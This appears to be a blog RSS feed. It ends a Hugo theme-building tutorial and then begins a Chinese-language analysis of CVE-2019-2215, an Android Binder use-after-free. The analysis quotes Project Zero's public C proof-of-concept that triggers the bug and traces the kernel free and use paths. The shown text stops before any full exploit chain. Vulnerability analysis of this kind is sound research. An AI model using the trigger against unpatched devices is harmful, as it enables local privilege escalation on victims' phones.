<p>The &ldquo;end&rdquo; command signals the end of the range iterator. The engine loops back to the top of the iteration when it finds &ldquo;end.&rdquo; Everything between the &ldquo;range&rdquo; and &ldquo;end&rdquo; is evaluated every time the engine goes through the iteration. In this file, that would cause the title from the first ten pages to be output as heading level one.</p>
<p>It&rsquo;s helpful to remember that some variables, like .Data, are created before any output files. Hugo loads every content file into the variable and then gives the template a chance to process before creating the HTML files.</p>
<p>Build the web site and then verify the results.</p>
<pre><code>$ rm -rf public
$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 found taxonomies: map[string]string{&quot;tag&quot;:&quot;tags&quot;, &quot;category&quot;:&quot;categories&quot;}
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
2 pages created
0 tags created
0 categories created
in 4 ms
$ find public -type f -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff  94 Sep 29 22:23 public/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:23 public/post/first/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:23 public/post/index.html
-rw-r--r--  1 quoha  staff   0 Sep 29 22:23 public/post/second/index.html
$ cat public/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;

    &lt;h1&gt;second&lt;/h1&gt;

    &lt;h1&gt;first&lt;/h1&gt;

&lt;/body&gt;
&lt;/html&gt;
$
</code></pre><p>Congratulations, the home page shows the title of the two posts. The posts themselves are still empty, but let&rsquo;s take a moment to appreciate what we&rsquo;ve done. Your template now generates output dynamically. Believe it or not, by inserting the range command inside of those curly braces, you&rsquo;ve learned everything you need to know to build a theme. All that&rsquo;s really left is understanding which template will be used to generate each content file and becoming familiar with the commands for the template engine.</p>
<p>And, if that were entirely true, this tutorial would be much shorter. There are a few things to know that will make creating a new template much easier. Don&rsquo;t worry, though, that&rsquo;s all to come.</p>
<h3 id="add-content-to-the-posts">Add Content to the Posts</h3>
<p>We&rsquo;re working with posts, which are in the content/post/ directory. That means that their section is &ldquo;post&rdquo; (and if we don&rsquo;t do something weird, their type is also &ldquo;post&rdquo;).</p>
<p>Hugo uses the section and type to find the template file for every piece of content. Hugo will first look for a template file that matches the section or type name. If it can&rsquo;t find one, then it will look in the _default/ directory. There are some twists that we&rsquo;ll cover when we get to categories and tags, but for now we can assume that Hugo will try post/single.html, then _default/single.html.</p>
<p>Now that we know the search rule, let&rsquo;s see what we actually have available:</p>
<pre><code>$ find themes/zafta -name single.html | xargs ls -l
-rw-r--r--  1 quoha  staff  132 Sep 29 17:31 themes/zafta/layouts/_default/single.html
</code></pre><p>We could create a new template, post/single.html, or change the default. Since we don&rsquo;t know of any other content types, let&rsquo;s start with updating the default.</p>
<p>Remember, any content that we haven&rsquo;t created a template for will end up using this template. That can be good or bad. Bad because I know that we&rsquo;re going to be adding different types of content and we&rsquo;re going to end up undoing some of the changes we&rsquo;ve made. It&rsquo;s good because we&rsquo;ll be able to see immediate results. It&rsquo;s also good to start here because we can start to build the basic layout for the site. As we add more content types, we&rsquo;ll refactor this file and move logic around. Hugo makes that fairly painless, so we&rsquo;ll accept the cost and proceed.</p>
<p>Please see the Hugo documentation on template rendering for all the details on determining which template to use. And, as the docs mention, if you&rsquo;re building a single page application (SPA) web site, you can delete all of the other templates and work with just the default single page. That&rsquo;s a refreshing amount of joy right there.</p>
<h4 id="update-the-template-file">Update the Template File</h4>
<pre><code>$ vi themes/zafta/layouts/_default/single.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;{{ .Title }}&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  {{ .Content }}
&lt;/body&gt;
&lt;/html&gt;
:wq

$
</code></pre><p>Build the web site and verify the results.</p>
<pre><code>$ rm -rf public
$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 found taxonomies: map[string]string{&quot;tag&quot;:&quot;tags&quot;, &quot;category&quot;:&quot;categories&quot;}
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
2 pages created
0 tags created
0 categories created
in 4 ms

$ find public -type f -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff   94 Sep 29 22:40 public/index.html
-rw-r--r--  1 quoha  staff  125 Sep 29 22:40 public/post/first/index.html
-rw-r--r--  1 quoha  staff    0 Sep 29 22:40 public/post/index.html
-rw-r--r--  1 quoha  staff  128 Sep 29 22:40 public/post/second/index.html

$ cat public/post/first/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;first&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;first&lt;/h1&gt;
  &lt;p&gt;my first post&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;

$ cat public/post/second/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;second&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h1&gt;second&lt;/h1&gt;
  &lt;p&gt;my second post&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;
$
</code></pre><p>Notice that the posts now have content. You can go to localhost:1313/post/first to verify.</p>
<h3 id="linking-to-content">Linking to Content</h3>
<p>The posts are on the home page. Let&rsquo;s add a link from there to the post. Since this is the home page, we&rsquo;ll update its template.</p>
<pre><code>$ vi themes/zafta/layouts/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  {{ range first 10 .Data.Pages }}
    &lt;h1&gt;&lt;a href=&quot;{{ .Permalink }}&quot;&gt;{{ .Title }}&lt;/a&gt;&lt;/h1&gt;
  {{ end }}
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Build the web site and verify the results.</p>
<pre><code>$ rm -rf public
$ hugo --verbose
INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/
INFO: 2014/09/29 found taxonomies: map[string]string{&quot;tag&quot;:&quot;tags&quot;, &quot;category&quot;:&quot;categories&quot;}
WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html]
0 draft content
0 future content
2 pages created
0 tags created
0 categories created
in 4 ms

$ find public -type f -name '*.html' | xargs ls -l
-rw-r--r--  1 quoha  staff  149 Sep 29 22:44 public/index.html
-rw-r--r--  1 quoha  staff  125 Sep 29 22:44 public/post/first/index.html
-rw-r--r--  1 quoha  staff    0 Sep 29 22:44 public/post/index.html
-rw-r--r--  1 quoha  staff  128 Sep 29 22:44 public/post/second/index.html

$ cat public/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;

    &lt;h1&gt;&lt;a href=&quot;/post/second/&quot;&gt;second&lt;/a&gt;&lt;/h1&gt;

    &lt;h1&gt;&lt;a href=&quot;/post/first/&quot;&gt;first&lt;/a&gt;&lt;/h1&gt;

&lt;/body&gt;
&lt;/html&gt;

$
</code></pre><h3 id="create-a-post-listing">Create a Post Listing</h3>
<p>We have the posts displaying on the home page and on their own page. We also have a file public/post/index.html that is empty. Let&rsquo;s make it show a list of all posts (not just the first ten).</p>
<p>We need to decide which template to update. This will be a listing, so it should be a list template. Let&rsquo;s take a quick look and see which list templates are available.</p>
<pre><code>$ find themes/zafta -name list.html | xargs ls -l
-rw-r--r--  1 quoha  staff  0 Sep 29 17:31 themes/zafta/layouts/_default/list.html
</code></pre><p>As with the single post, we have to decide to update _default/list.html or create post/list.html. We still don&rsquo;t have multiple content types, so let&rsquo;s stay consistent and update the default list template.</p>
<h2 id="creating-top-level-pages">Creating Top Level Pages</h2>
<p>Let&rsquo;s add an &ldquo;about&rdquo; page and display it at the top level (as opposed to a sub-level like we did with posts).</p>
<p>The default in Hugo is to use the directory structure of the content/ directory to guide the location of the generated html in the public/ directory. Let&rsquo;s verify that by creating an &ldquo;about&rdquo; page at the top level:</p>
<pre><code>$ vi content/about.md
+++
title = &quot;about&quot;
description = &quot;about this site&quot;
date = &quot;2014-09-27&quot;
slug = &quot;about time&quot;
+++

## about us

i'm speechless
:wq
</code></pre><p>Generate the web site and verify the results.</p>
<pre><code>$ find public -name '*.html' | xargs ls -l
-rw-rw-r--  1 mdhender  staff   334 Sep 27 15:08 public/about-time/index.html
-rw-rw-r--  1 mdhender  staff   527 Sep 27 15:08 public/index.html
-rw-rw-r--  1 mdhender  staff   358 Sep 27 15:08 public/post/first-post/index.html
-rw-rw-r--  1 mdhender  staff     0 Sep 27 15:08 public/post/index.html
-rw-rw-r--  1 mdhender  staff   342 Sep 27 15:08 public/post/second-post/index.html
</code></pre><p>Notice that the page wasn&rsquo;t created at the top level. It was created in a sub-directory named &lsquo;about-time/'. That name came from our slug. Hugo will use the slug to name the generated content. It&rsquo;s a reasonable default, by the way, but we can learn a few things by fighting it for this file.</p>
<p>One other thing. Take a look at the home page.</p>
<pre><code>$ cat public/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;&lt;a href=&quot;http://localhost:1313/post/theme/&quot;&gt;creating a new theme&lt;/a&gt;&lt;/h1&gt;
    &lt;h1&gt;&lt;a href=&quot;http://localhost:1313/about-time/&quot;&gt;about&lt;/a&gt;&lt;/h1&gt;
    &lt;h1&gt;&lt;a href=&quot;http://localhost:1313/post/second-post/&quot;&gt;second&lt;/a&gt;&lt;/h1&gt;
    &lt;h1&gt;&lt;a href=&quot;http://localhost:1313/post/first-post/&quot;&gt;first&lt;/a&gt;&lt;/h1&gt;
&lt;script&gt;document.write('&lt;script src=&quot;http://'
        + (location.host || 'localhost').split(':')[0]
		+ ':1313/livereload.js?mindelay=10&quot;&gt;&lt;/'
        + 'script&gt;')&lt;/script&gt;&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Notice that the &ldquo;about&rdquo; link is listed with the posts? That&rsquo;s not desirable, so let&rsquo;s change that first.</p>
<pre><code>$ vi themes/zafta/layouts/index.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;h1&gt;posts&lt;/h1&gt;
  {{ range first 10 .Data.Pages }}
    {{ if eq .Type &quot;post&quot;}}
      &lt;h2&gt;&lt;a href=&quot;{{ .Permalink }}&quot;&gt;{{ .Title }}&lt;/a&gt;&lt;/h2&gt;
    {{ end }}
  {{ end }}

  &lt;h1&gt;pages&lt;/h1&gt;
  {{ range .Data.Pages }}
    {{ if eq .Type &quot;page&quot; }}
      &lt;h2&gt;&lt;a href=&quot;{{ .Permalink }}&quot;&gt;{{ .Title }}&lt;/a&gt;&lt;/h2&gt;
    {{ end }}
  {{ end }}
&lt;/body&gt;
&lt;/html&gt;
:wq
</code></pre><p>Generate the web site and verify the results. The home page has two sections, posts and pages, and each section has the right set of headings and links in it.</p>
<p>But, that about page still renders to about-time/index.html.</p>
<pre><code>$ find public -name '*.html' | xargs ls -l
-rw-rw-r--  1 mdhender  staff    334 Sep 27 15:33 public/about-time/index.html
-rw-rw-r--  1 mdhender  staff    645 Sep 27 15:33 public/index.html
-rw-rw-r--  1 mdhender  staff    358 Sep 27 15:33 public/post/first-post/index.html
-rw-rw-r--  1 mdhender  staff      0 Sep 27 15:33 public/post/index.html
-rw-rw-r--  1 mdhender  staff    342 Sep 27 15:33 public/post/second-post/index.html
</code></pre><p>Knowing that hugo is using the slug to generate the file name, the simplest solution is to change the slug. Let&rsquo;s do it the hard way and change the permalink in the configuration file.</p>
<pre><code>$ vi config.toml
[permalinks]
	page = &quot;/:title/&quot;
	about = &quot;/:filename/&quot;
</code></pre><p>Generate the web site and verify that this didn&rsquo;t work. Hugo lets &ldquo;slug&rdquo; or &ldquo;URL&rdquo; override the permalinks setting in the configuration file. Go ahead and comment out the slug in content/about.md, then generate the web site to get it to be created in the right place.</p>
<h2 id="sharing-templates">Sharing Templates</h2>
<p>If you&rsquo;ve been following along, you probably noticed that posts have titles in the browser and the home page doesn&rsquo;t. That&rsquo;s because we didn&rsquo;t put the title in the home page&rsquo;s template (layouts/index.html). That&rsquo;s an easy thing to do, but let&rsquo;s look at a different option.</p>
<p>We can put the common bits into a shared template that&rsquo;s stored in the themes/zafta/layouts/partials/ directory.</p>
<h3 id="create-the-header-and-footer-partials">Create the Header and Footer Partials</h3>
<p>In Hugo, a partial is a sugar-coated template. Normally a template reference has a path specified. Partials are different. Hugo searches for them along a TODO defined search path. This makes it easier for end-users to override the theme&rsquo;s presentation.</p>
<pre><code>$ vi themes/zafta/layouts/partials/header.html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;title&gt;{{ .Title }}&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
:wq

$ vi themes/zafta/layouts/partials/footer.html
&lt;/body&gt;
&lt;/html&gt;
:wq
</code></pre><h3 id="update-the-home-page-template-to-use-the-partials">Update the Home Page Template to Use the Partials</h3>
<p>The most noticeable difference between a template call and a partials call is the lack of path:</p>
<pre><code>{{ template &quot;theme/partials/header.html&quot; . }}
</code></pre><p>versus</p>
<pre><code>{{ partial &quot;header.html&quot; . }}
</code></pre><p>Both pass in the context.</p>
<p>Let&rsquo;s change the home page template to use these new partials.</p>
<pre><code>$ vi themes/zafta/layouts/index.html
{{ partial &quot;header.html&quot; . }}

  &lt;h1&gt;posts&lt;/h1&gt;
  {{ range first 10 .Data.Pages }}
    {{ if eq .Type &quot;post&quot;}}
      &lt;h2&gt;&lt;a href=&quot;{{ .Permalink }}&quot;&gt;{{ .Title }}&lt;/a&gt;&lt;/h2&gt;
    {{ end }}
  {{ end }}

  &lt;h1&gt;pages&lt;/h1&gt;
  {{ range .Data.Pages }}
    {{ if or (eq .Type &quot;page&quot;) (eq .Type &quot;about&quot;) }}
      &lt;h2&gt;&lt;a href=&quot;{{ .Permalink }}&quot;&gt;{{ .Type }} - {{ .Title }} - {{ .RelPermalink }}&lt;/a&gt;&lt;/h2&gt;
    {{ end }}
  {{ end }}

{{ partial &quot;footer.html&quot; . }}
:wq
</code></pre><p>Generate the web site and verify the results. The title on the home page is now &ldquo;your title here&rdquo;, which comes from the &ldquo;title&rdquo; variable in the config.toml file.</p>
<h3 id="update-the-default-single-template-to-use-the-partials">Update the Default Single Template to Use the Partials</h3>
<pre><code>$ vi themes/zafta/layouts/_default/single.html
{{ partial &quot;header.html&quot; . }}

  &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  {{ .Content }}

{{ partial &quot;footer.html&quot; . }}
:wq
</code></pre><p>Generate the web site and verify the results. The title on the posts and the about page should both reflect the value in the markdown file.</p>
<h2 id="add-date-published-to-posts">Add “Date Published” to Posts</h2>
<p>It&rsquo;s common to have posts display the date that they were written or published, so let&rsquo;s add that. The front matter of our posts has a variable named &ldquo;date.&rdquo; It&rsquo;s usually the date the content was created, but let&rsquo;s pretend that&rsquo;s the value we want to display.</p>
<h3 id="add-date-published-to-the-template">Add “Date Published” to the Template</h3>
<p>We&rsquo;ll start by updating the template used to render the posts. The template code will look like:</p>
<pre><code>{{ .Date.Format &quot;Mon, Jan 2, 2006&quot; }}
</code></pre><p>Posts use the default single template, so we&rsquo;ll change that file.</p>
<pre><code>$ vi themes/zafta/layouts/_default/single.html
{{ partial &quot;header.html&quot; . }}

  &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  &lt;h2&gt;{{ .Date.Format &quot;Mon, Jan 2, 2006&quot; }}&lt;/h2&gt;
  {{ .Content }}

{{ partial &quot;footer.html&quot; . }}
:wq
</code></pre><p>Generate the web site and verify the results. The posts now have the date displayed in them. There&rsquo;s a problem, though. The &ldquo;about&rdquo; page also has the date displayed.</p>
<p>As usual, there are a couple of ways to make the date display only on posts. We could do an &ldquo;if&rdquo; statement like we did on the home page. Another way would be to create a separate template for posts.</p>
<p>The &ldquo;if&rdquo; solution works for sites that have just a couple of content types. It aligns with the principle of &ldquo;code for today,&rdquo; too.</p>
<p>Let&rsquo;s assume, though, that we&rsquo;ve made our site so complex that we feel we have to create a new template type. In Hugo-speak, we&rsquo;re going to create a section template.</p>
<p>Let&rsquo;s restore the default single template before we forget.</p>
<pre><code>$ mkdir themes/zafta/layouts/post
$ vi themes/zafta/layouts/_default/single.html
{{ partial &quot;header.html&quot; . }}

  &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  {{ .Content }}

{{ partial &quot;footer.html&quot; . }}
:wq
</code></pre><p>Now we&rsquo;ll update the post&rsquo;s version of the single template. If you remember Hugo&rsquo;s rules, the template engine will use this version over the default.</p>
<pre><code>$ vi themes/zafta/layouts/post/single.html
{{ partial &quot;header.html&quot; . }}

  &lt;h1&gt;{{ .Title }}&lt;/h1&gt;
  &lt;h2&gt;{{ .Date.Format &quot;Mon, Jan 2, 2006&quot; }}&lt;/h2&gt;
  {{ .Content }}

{{ partial &quot;footer.html&quot; . }}
:wq

</code></pre><p>Note that we removed the date logic from the default template and put it in the post template. Generate the web site and verify the results. Posts have dates and the about page doesn&rsquo;t.</p>
<h3 id="dont-repeat-yourself">Don&rsquo;t Repeat Yourself</h3>
<p>DRY is a good design goal and Hugo does a great job supporting it. Part of the art of a good template is knowing when to add a new template and when to update an existing one. While you&rsquo;re figuring that out, accept that you&rsquo;ll be doing some refactoring. Hugo makes that easy and fast, so it&rsquo;s okay to delay splitting up a template.</p>
]]></content>
        </item>
        
        <item>
            <title>CVE-2019-2215分析利用记录</title>
            <link>https://kuekiko.top/posts/2020/06/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Tue, 30 Jun 2020 01:15:26 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2020/06/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
            <description>0x00 前言 CVE-2019-2215最初是由syzbot(syzkaller bot)在2017年发现的一个bug，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。
Project Zero的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该漏洞。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。
0x01 分析环境  Android avd api29 x86_64 kernel：q-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b pixel Android 10 kernel 3.18  0x02 漏洞分析 漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。
原理分析 先看一个project-zero公开的poc
/* binder_poll() passes the thread-&amp;gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free.</description>
            <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215">CVE-2019-2215</a>最初是由syzbot(syzkaller bot)在2017年发现的一个<a href="https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ">bug</a>，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。</p>
<p><strong>Project Zero</strong>的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">漏洞</a>。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。</p>
<h3 id="0x01-分析环境">0x01 分析环境</h3>
<ul>
<li>Android avd api29 x86_64</li>
<li>kernel：q-goldfish-android-goldfish-4.14-dev commit id <code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b</code></li>
<li>pixel Android 10 kernel 3.18</li>
</ul>
<h3 id="0x02-漏洞分析">0x02 漏洞分析</h3>
<p>漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。</p>
<h4 id="原理分析">原理分析</h4>
<p>先看一个project-zero公开的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">poc</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
</span><span style="color:#75715e">binder_poll() passes the thread-&gt;wait waitqueue that
</span><span style="color:#75715e">can be slept on for work. When a thread that uses
</span><span style="color:#75715e">epoll explicitly exits using BINDER_THREAD_EXIT,
</span><span style="color:#75715e">the waitqueue is freed, but it is never removed
</span><span style="color:#75715e">from the corresponding epoll data structure. When
</span><span style="color:#75715e">the process subsequently exits, the epoll cleanup
</span><span style="color:#75715e">code tries to access the waitlist, which results in
</span><span style="color:#75715e">a use-after-free. 
</span><span style="color:#75715e">*/</span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/epoll.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#define BINDER_THREAD_EXIT 0x40046208ul
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">int</span> fd, epfd;
    <span style="color:#66d9ef">struct</span> epoll_event event <span style="color:#f92672">=</span> {.events <span style="color:#f92672">=</span> EPOLLIN};

    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/binder&#34;</span>, O_RDONLY);
    epfd <span style="color:#f92672">=</span> epoll_create(<span style="color:#ae81ff">1000</span>);
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, <span style="color:#f92672">&amp;</span>event); <span style="color:#75715e">//[1]
</span><span style="color:#75715e"></span>    ioctl(fd, BINDER_THREAD_EXIT, NULL); <span style="color:#75715e">//[2]
</span><span style="color:#75715e"></span>}
</code></pre></div><p>漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-&gt;wait，导致UAF。</p>
<p>既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。</p>
<ul>
<li><strong>allocate</strong></li>
</ul>
<p>在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且<code>fd-&gt;pricate_data = binder_proc</code>，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，<a href="https://github.com/sharif-dev/AndroidKernelVulnerability">图来源</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200628024448.png" alt=""></p>
<ul>
<li><strong>free</strong></li>
</ul>
<p>poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从<code>fd-&gt;private_data</code>中释放<strong>binder_thread</strong>结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200628102722.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">binder_free_thread</span>(<span style="color:#66d9ef">struct</span> binder_thread <span style="color:#f92672">*</span><span style="color:#66d9ef">thread</span>)
{
	BUG_ON(<span style="color:#f92672">!</span>list_empty(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>todo));
	binder_stats_deleted(BINDER_STAT_THREAD);
	binder_proc_dec_tmpref(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>proc);
	put_task_struct(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>task);
	kfree(<span style="color:#66d9ef">thread</span>);
}
</code></pre></div><ul>
<li><strong>use</strong></li>
</ul>
<p>在当前线程退出时，会自动调用<strong>epoll_ctl(epfd, DEL, fd, event)</strong>，这里面会调用到<strong>ep_remove(event_poll, ep_item)</strong>，这个方法里面会进行unlink wait queues双链表操作，其中的操作<code>entry = wait-&gt;entry;</code>这里的指针指向已经释放的binder_thread-&gt;wait。造成use after free。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ep_remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> eppoll_entry <span style="color:#f92672">*</span>pwq)  <span style="color:#75715e">//这里的pwq就是我们已经释放掉的binder_thread
</span><span style="color:#75715e"></span>{
	wait_queue_head_t <span style="color:#f92672">*</span>whead;
	rcu_read_lock();
	whead <span style="color:#f92672">=</span> smp_load_acquire(<span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>whead);
	<span style="color:#66d9ef">if</span> (whead)
		remove_wait_queue(whead, <span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>wait); <span style="color:#75715e">//进入remove_wait_queue
</span><span style="color:#75715e"></span>	rcu_read_unlock();
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> wait_queue_head <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> wait_queue_entry <span style="color:#f92672">*</span>wq_entry)
{
	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;

	spin_lock_irqsave(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
	__remove_wait_queue(wq_head, wq_entry);  <span style="color:#75715e">//这里传入的第二个参数&amp;pwq-&gt;wait之前已经被释放
</span><span style="color:#75715e"></span>	spin_unlock_irqrestore(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
}
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span>
<span style="color:#a6e22e">__remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> wait_queue_head <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> wait_queue_entry <span style="color:#f92672">*</span>wq_entry)
{
        list_del(<span style="color:#f92672">&amp;</span>wq_entry<span style="color:#f92672">-&gt;</span>entry);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list_del</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
{
        __list_del_entry(entry);
        [...]
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del_entry</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
{
        [...]
        __list_del(entry<span style="color:#f92672">-&gt;</span>prev, entry<span style="color:#f92672">-&gt;</span>next);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span> prev, <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span> next)
{
        next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> prev; <span style="color:#75715e">//unlink操作
</span><span style="color:#75715e"></span>        WRITE_ONCE(prev<span style="color:#f92672">-&gt;</span>next, next);
}
</code></pre></div><p>将<code>binder_thread-&gt;wait.head</code>的指针写入<code>binder_thread-&gt;wait.head.prev</code>和<code>binder_thread-&gt;wait.head.next</code>。</p>
<h4 id="poc调试分析">Poc调试分析</h4>
<p>这里手上没有直接能用的设备，用的模拟器调试。可直接按照<a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements">这个教程</a>的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。</p>
